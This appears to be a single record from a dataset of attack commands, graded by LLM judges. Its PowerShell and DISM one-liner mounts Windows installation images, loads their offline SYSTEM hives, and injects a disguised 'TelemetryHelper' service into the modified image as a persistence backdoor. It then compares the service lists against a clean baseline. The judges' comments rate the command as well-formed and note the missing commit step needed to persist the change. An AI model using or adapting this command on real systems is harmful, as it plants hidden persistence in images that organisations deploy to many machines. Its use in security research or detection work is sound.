command: dism /Mount-Image /ImageFile:C:\images\install_clean.wim /Index:1 /MountDir:C:\Mount\Base; dism /Mount-Image /ImageFile:C:\images\install_mod.wim /Index:1 /MountDir:C:\Mount\Win; reg load HKLM\BASESYS C:\Mount\Base\Windows\System32\Config\SYSTEM >$null; reg load HKLM\OFFSYS C:\Mount\Win\Windows\System32\Config\SYSTEM >$null; New-Item -Path "Registry::HKEY_LOCAL_MACHINE\OFFSYS\ControlSet001\Services\TelemetryHelper" -Force | Out-Null; New-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\OFFSYS\ControlSet001\Services\TelemetryHelper" -Name "ImagePath" -Value "\SystemRoot\System32\svchost.exe -k netsvcs -s TelemetryHelper" -PropertyType ExpandString -Force | Out-Null; $b=(Get-ChildItem "Registry::HKEY_LOCAL_MACHINE\BASESYS\ControlSet001\Services" | ForEach-Object {Split-Path $_.Name -Leaf}); $m=(Get-ChildItem "Registry::HKEY_LOCAL_MACHINE\OFFSYS\ControlSet001\Services" | ForEach-Object {Split-Path $_.Name -Leaf}); Compare-Object $b $m
explanation: Creates a new service entry in the offline SYSTEM hive of the image and compares the list of services with the clean baseline to validate the injected service.
rationale_steps: Mount images and load SYSTEM hives (Admin).
Create a new service in the modified image's registry.
Enumerate and Compare-Object the service names between baseline and modified.

llm_judgments.syntactic_justification: Well-formed PowerShell one-liner with balanced quotes, valid DISM/reg/cmdlet syntax, proper semicolon separators, and correct registry provider paths.
llm_judgments.semantic_justification: It mounts WIMs, loads offline SYSTEM hives, injects a new service key, and compares against a clean baseline (aligned with T1601), but lacks commit/unload steps and requires administrative privileges and additional service parameters for a fully functional service.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with valid DISM flags, registry operations, and pipeline usage, though mixing semicolons as separators between DISM CLI commands and PowerShell cmdlets in a single session may cause parsing issues depending on execution context.
llm_judgments.semantic_justification: The command accurately implements T1601 by mounting a clean and modified WIM image offline, injecting a fake service ('TelemetryHelper') into the modified image's SYSTEM hive to mimic a legitimate telemetry service, and then performing a differential comparison against the clean baseline to validate the injected persistence mechanism—fully consistent with offline firmware/image tampering and backdoor insertion.

llm_judgments.syntactic_justification: The command sequence is well-formed, using correct DISM flags, proper registry provider paths in PowerShell, and valid command separators.
llm_judgments.semantic_justification: The command accurately implements the technique by mounting WIM files and injecting a service into an offline registry hive, though it lacks the necessary 'dism /Unmount-Image /Commit' step to persist changes and incorrectly lists 'None' for required privileges.
